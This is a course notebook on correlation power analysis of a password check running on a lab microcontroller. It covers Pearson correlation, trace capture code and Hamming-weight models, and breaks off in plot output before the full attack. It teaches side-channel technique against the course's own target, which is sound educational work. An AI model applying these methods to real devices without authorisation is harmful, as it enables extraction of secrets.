{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lecture 4: Password CPA Attack - Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this example we want to improve the password check again to be resistant against the attack from the last tutorial.\n",
    "\n",
    "## Improving the code\n",
    "\n",
    "Let's first recap the password checking loop from the last lecture:\n",
    "```c\n",
    "for(uint8_t i = 0; i < sizeof(stored_password); i++)\n",
    "{\n",
    "    if (stored_password[i] != passwd[i])\n",
    "    {\n",
    "        password_wrong = 1;\n",
    "    }\n",
    "}\n",
    "```\n",
    "\n",
    "The differences attack discussed in the last example worked because of the different power consumption when executing the code inside the if clause. This is addressed by the following code.\n",
    "\n",
    "```c\n",
    "uint8_t password_wrong = 0;\n",
    "for(uint8_t i = 0; i < sizeof(stored_password); i++)\n",
    "{\n",
    "    password_wrong |= stored_password[i] ^ passwd[i];\n",
    "}\n",
    "```\n",
    "\n",
    "This is an excerpt from `4_password_fixed.c`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Pearson correlation coefficient\n",
    "An interesting statistical formula to face this problem is given by the *Pearson correlation coefficient*. For two random variables $X, Y$ it is defined as\n",
    "\n",
    "$$\\rho_{X,Y} := \\frac{\\mathrm{Cov}(X, Y)}{\\sqrt{\\mathrm{Var}(X)} \\sqrt{\\mathrm{Var}(Y)}} \\ \\in [-1, 1]\\,.$$\n",
    "\n",
    "For two samples of finite length $x = {x_1, ..., x_n}$, $y = {y_1, ..., y_n}$ it can be defined as \n",
    "\n",
    "$$r_{x,y} := \\frac{\\sum_{i=1}^n (x_i - \\bar x)(y_i - \\bar y)}{\\sqrt{\\sum_{i=1}^n (x_i - \\bar x)^2}\\sqrt{\\sum_{i=1}^n (y_i - \\bar y)^2}} \\ \\in [-1, 1]\\,,$$\n",
    "\n",
    "where $\\bar x := \\frac{1}{n} \\sum_{i=1}^n x_i$ is the mean of a sample $x$."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<div style=\"background: #f0ffe0; padding: 15px; border: 1px solid slategray;\">\n",
    "<div class=\"h2\" style=\"font-variant: small-caps;\">Exercise 1</div>\n",
    "    \n",
    "1. Implement Pearson correlation coefficient in python.\n",
    "2. Test your implementation against the following (x, y)-data with `size = 50`:\n",
    "    1. `(range(size), 5 * np.array(range(size)) + np.random.uniform(-size/4, size/4, size=size))` => $r \\approx 0.99$\n",
    "    2. `(range(size), np.array(range(size)) + np.random.uniform(-size, size, size=size) + 10)` => $r \\approx 0.32$\n",
    "    3. `(range(size), -3 * np.array(range(size)) + np.random.uniform(-size/4, size/4, size=size) + 200)` => $r \\approx -0.98$\n",
    "    4. `(range(size), 100 * np.sin(np.array(range(size)) / size * np.pi + np.pi) + np.random.uniform(-size/10, size/10, size=size))` => $r \\approx -0.05$\n",
    "3. Visualize above example data.\n",
    "</div>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "### Switched to Markdown\n",
    "size = 50\n",
    "data = []\n",
    "data.append((range(size), 5 * np.array(range(size)) + np.random.uniform(-size/4, size/4, size=size)))\n",
    "data.append((range(size), np.array(range(size)) + np.random.uniform(-size, size, size=size) + 10))\n",
    "data.append((range(size), -3 * np.array(range(size)) + np.random.uniform(-size/4, size/4, size=size) + 200))\n",
    "data.append((range(size), 100 * np.sin(np.array(range(size)) / size * np.pi + np.pi) + np.random.uniform(-size/10, size/10, size=size)))\n",
    "\n",
    "for i in data:\n",
    "    print(append(person_correlation(i[0], i[1])))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "How to use this as principle for an attack?\n",
    "\n",
    "We sae in the previous notebook that there is a _linear_ relationship between the trace at a given point and the hamming weight of the attempt. Now we can quantify a linear dependency!\n",
    "\n",
    "So, we can develop an attack out of this principle:\n",
    "\n",
    "1. Record traces with random input.\n",
    "2. Focus on a point in the program where the input \"collides\" with the secret. In our case this is the XOR.\n",
    "3. For each input compute a \"forecast\" of hamming weights. If we do this for all possible secrets we will see that there is one guess where the Pearson coefficient between the forecast and the traces at this certain point maximizes.\n",
    "\n",
    "It is still open how to find the sweet spot. We just don't try to \"find\" it. We're just computing the Pearson coefficient for _every_ trace point and keep the best one."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<div style=\"background: #f0ffe0; padding: 15px; border: 1px solid slategray;\">\n",
    "<div class=\"h2\" style=\"font-variant: small-caps;\">Exercise 2</div>\n",
    "    \n",
    "Develop an attack using Pearson correlation coefficient.\n",
    "\n",
    "1. Start with the first character:\n",
    "   1. Capture a few hundred (~500) traces with random input.\n",
    "   2. For each guess: Calculate the pointwise Pearson correlation between the forecast and the traces. Keep the absolute maximum of the correlations.\n",
    "   3. Now keep the guess with the maximal correlation.\n",
    "2. Extend the attack to all other characters.\n",
    "\n",
    "Note: Due to interferences the correct character might not be the one with the highest Pearson coefficient. Thus it is worth to keep the best 2-3 guesses.\n",
    "\n",
    "</div>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"1002\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  const force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  const JS_MIME_TYPE = 'application/javascript';\n  const HTML_MIME_TYPE = 'text/html';\n  const EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n  const CLASS_NAME = 'output_bokeh rendered_html';\n\n  /**\n   * Render data to the DOM node\n   */\n  function render(props, node) {\n    const script = document.createElement(\"script\");\n    node.appendChild(script);\n  }\n\n  /**\n   * Handle when an output is cleared or removed\n   */\n  function handleClearOutput(event, handle) {\n    const cell = handle.cell;\n\n    const id = cell.output_area._bokeh_element_id;\n    const server_id = cell.output_area._bokeh_server_id;\n    // Clean up Bokeh references\n    if (id != null && id in Bokeh.index) {\n      Bokeh.index[id].model.document.clear();\n      delete Bokeh.index[id];\n    }\n\n    if (server_id !== undefined) {\n      // Clean up Bokeh references\n      const cmd_clean = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n      cell.notebook.kernel.execute(cmd_clean, {\n        iopub: {\n          output: function(msg) {\n            const id = msg.content.text.trim();\n            if (id in Bokeh.index) {\n              Bokeh.index[id].model.document.clear();\n              delete Bokeh.index[id];\n            }\n          }\n        }\n      });\n      // Destroy server and session\n      const cmd_destroy = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n      cell.notebook.kernel.execute(cmd_destroy);\n    }\n  }\n\n  /**\n   * Handle when a new output is added\n   */\n  function handleAddOutput(event, handle) {\n    const output_area = handle.output_area;\n    const output = handle.output;\n\n    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n      return\n    }\n\n    const toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n\n    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n      // store reference to embed id on output_area\n      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n    }\n    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n      const bk_div = document.createElement(\"div\");\n      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n      const script_attrs = bk_div.children[0].attributes;\n      for (let i = 0; i < script_attrs.length; i++) {\n        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n      }\n      // store reference to server id on output_area\n      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n    }\n  }\n\n  function register_renderer(events, OutputArea) {\n\n    function append_mime(data, metadata, element) {\n      // create a DOM node to render to\n      const toinsert = this.create_output_subarea(\n        metadata,\n        CLASS_NAME,\n        EXEC_MIME_TYPE\n      );\n      this.keyboard_manager.register_events(toinsert);\n      // Render to node\n      const props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n      render(props, toinsert[toinsert.length - 1]);\n      element.append(toinsert);\n      return toinsert\n    }\n\n    /* Handle when an output is cleared or removed */\n    events.on('clear_output.CodeCell', handleClearOutput);\n    events.on('delete.Cell', handleClearOutput);\n\n    /* Handle when a new output is added */\n    events.on('output_added.OutputArea', handleAddOutput);\n\n    /**\n     * Register the mime type and append_mime function with output_area\n     */\n    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n      /* Is output safe? */\n      safe: true,\n      /* Index of renderer in `output_area.display_order` */\n      index: 0\n    });\n  }\n\n  // register the mime type if in Jupyter Notebook environment and previously unregistered\n  if (root.Jupyter !== undefined) {\n    const events = require('base/js/events');\n    const OutputArea = require('notebook/js/outputarea').OutputArea;\n\n    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n      register_renderer(events, OutputArea);\n    }\n  }\n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  const NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    const el = document.getElementById(\"1002\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-2.4.1.min.js\"];\n  const css_urls = [];\n  \n\n  const inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (let i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      const cell = $(document.getElementById(\"1002\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));",
      "application/vnd.bokehjs_load.v0+json": ""
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import pandas as pd\n",
    "import bokeh\n",
    "from bokeh.plotting import figure, show \n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import LinearColorMapper\n",
    "from bokeh.models import CrosshairTool\n",
    "from bokeh.palettes import Category10_10\n",
    "\n",
    "output_notebook()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import securec\n",
    "from securec import util\n",
    "scope, target = util.init()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "XMEGA Programming flash...\n",
      "XMEGA Reading flash...\n",
      "Verified flash OK, 3931 bytes\n",
      "\u001b[32m✓\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "securec.util.compile_and_flash('./4_password_fixed.c', cryptooptions=['CRYPTO_TARGET=TINYAES128C'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "trace_samples = 500\n",
    "\n",
    "scope.default_setup()\n",
    "scope.adc.samples = trace_samples\n",
    "\n",
    "def capture(attempt, count=1):\n",
    "    if isinstance(attempt, str):\n",
    "        attempt = attempt.encode('iso-8859-1')\n",
    "    elif isinstance(attempt, int):\n",
    "        attempt = bytes([attempt])\n",
    "    traces = []\n",
    "    for _ in range(count):\n",
    "        scope.arm()\n",
    "        target.simpleserial_write(0x01, attempt + b'\\x00' * (10 - len(attempt)))\n",
    "        result = target.simpleserial_read(0x01, 1)\n",
    "        traces.append(util.capture())\n",
    "    return np.mean(np.array(traces), axis=0), not bool(result[0])\n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def person_correlation(x,y):\n",
    "    x_array = np.array(x)\n",
    "    y_array = np.array(y)\n",
    "    average_x = np.average(x_array)\n",
    "    average_y = np.average(y_array)\n",
    "    top = np.sum((x_array - average_x) * (y_array - average_y))\n",
    "    bottom = np.sqrt(np.sum(np.power(x_array - average_x, 2)) * np.sum(np.power(y_array - average_y, 2)))\n",
    "    return top / bottom\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "HW = [bin(n).count(\"1\") for n in range(0, 256)]\n",
    "\n",
    "def hw(n):\n",
    "    if isinstance(n, str):\n",
    "        return HW[ord(n)]\n",
    "    return HW[n]\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5a0f267d97df4c5c8103b32abedcc3e7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/500 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import random\n",
    "import tqdm\n",
    "import tqdm.notebook\n",
    "\n",
    "trace_nums = 500\n",
    "\n",
    "\n",
    "traces = []\n",
    "inputs = []\n",
    "for _ in tqdm.notebook.tqdm(range(trace_nums)):\n",
    "    input = bytes([random.randint(0, 255) for _ in range(9)])\n",
    "    traces.append(capture(input))\n",
    "    inputs.append(input)\n",
    "traces = np.array(traces, dtype=object)\n",
    "attempts = np.array([list(a) for a in inputs])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"65241bde-e384-4d73-b40a-fed440af0335\" data-root-id=\"1003\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "(function(root) {\n  function embed_document(root) {\n    \n  const docs_json = {\"a709b2fb-4ac4-4d15-ac00-03d2ba414f12\":{\"defs\":[],\"roots\":{\"references\":[{\"attributes\":{\"below\":[{\"id\":\"1012\"}],\"center\":[{\"id\":\"1015\"},{\"id\":\"1019\"}],\"height\":400,\"left\":[{\"id\":\"1016\"}],\"renderers\":[{\"id\":\"1040\"},{\"id\":\"1046\"},{\"id\":\"1052\"},{\"id\":\"1058\"},{\"id\":\"1064\"}],\"title\":{\"id\":\"1066\"},\"toolbar\":{\"id\":\"1027\"},\"width\":900,\"x_range\":{\"id\":\"1004\"},\"x_scale\":{\"id\":\"1008\"},\"y_range\":{\"id\":\"1006\"},\"y_scale\":{\"id\":\"1010\"}},\"id\":\"1003\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"axis\":{\"id\":\"1012\"},\"coordinates\":null,\"group\":null,\"ticker\":null},\"id\":\"1015\",\"type\":\"Grid\"},{\"attributes\":{\"source\":{\"id\":\"1060\"}},\"id\":\"1065\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"1076\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1048\"},\"glyph\":{\"id\":\"1049\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1051\"},\"nonselection_glyph\":{\"id\":\"1050\"},\"view\":{\"id\":\"1053\"}},\"id\":\"1052\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1037\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1069\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"line_alpha\":0.2,\"line_color\":\"#9467bd\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1063\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1013\",\"type\":\"BasicTicker\"},{\"attributes\":{},\"id\":\"1020\",\"type\":\"PanTool\"},{\"attributes\":{},\"id\":\"1004\",\"type\":\"DataRange1d\"},{\"attributes\":{},\"id\":\"1077\",\"type\":\"Selection\"},{\"attributes\":{\"coordinates\":null,\"group\":null},\"id\":\"1066\",\"type\":\"Title\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#2ca02c\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1050\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1070\",\"type\":\"AllLabels\"},{\"attributes\":{},\"id\":\"1017\",\"type\":\"BasicTicker\"},{\"attributes\":{\"coordinates\":null,\"formatter\":{\"id\":\"1072\"},\"group\":null,\"major_label_policy\":{\"id\":\"1073\"},\"ticker\":{\"id\":\"1013\"}},\"id\":\"1012\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"1034\",\"type\":\"CrosshairTool\"},{\"attributes\":{},\"id\":\"1072\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"coordinates\":null,\"formatter\":{\"id\":\"1069\"},\"group\":null,\"major_label_policy\":{\"id\":\"1070\"},\"ticker\":{\"id\":\"1017\"}},\"id\":\"1016\",\"type\":\"LinearAxis\"},{\"attributes\":{\"tools\":[{\"id\":\"1020\"},{\"id\":\"1021\"},{\"id\":\"1022\"},{\"id\":\"1023\"},{\"id\":\"1024\"},{\"id\":\"1025\"},{\"id\":\"1034\"}]},\"id\":\"1027\",\"type\":\"Toolbar\"},{\"attributes\":{},\"id\":\"1025\",\"type\":\"HelpTool\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1036\"},\"glyph\":{\"id\":\"1037\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1039\"},\"nonselection_glyph\":{\"id\":\"1038\"},\"view\":{\"id\":\"1041\"}},\"id\":\"1040\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"1073\",\"type\":\"AllLabels\"},{\"attributes\":{},\"id\":\"1021\",\"type\":\"WheelZoomTool\"},{\"attributes\":{\"line_alpha\":0.2,\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1039\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1082\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"overlay\":{\"id\":\"1026\"}},\"id\":\"1022\",\"type\":\"BoxZoomTool\"},{\"attributes\":{},\"id\":\"1023\",\"type\":\"SaveTool\"},{\"attributes\":{},\"id\":\"1024\",\"type\":\"ResetTool\"},{\"attributes\":{\"source\":{\"id\":\"1036\"}},\"id\":\"1041\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"1083\",\"type\":\"Selection\"},{\"attributes\":{\"axis\":{\"id\":\"1016\"},\"coordinates\":null,\"dimension\":1,\"group\":null,\"ticker\":null},\"id\":\"1019\",\"type\":\"Grid\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1038\",\"type\":\"Line\"},{\"attributes\":{\"data\":{\"x\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499],\"y\":{\"__ndarray__\":\"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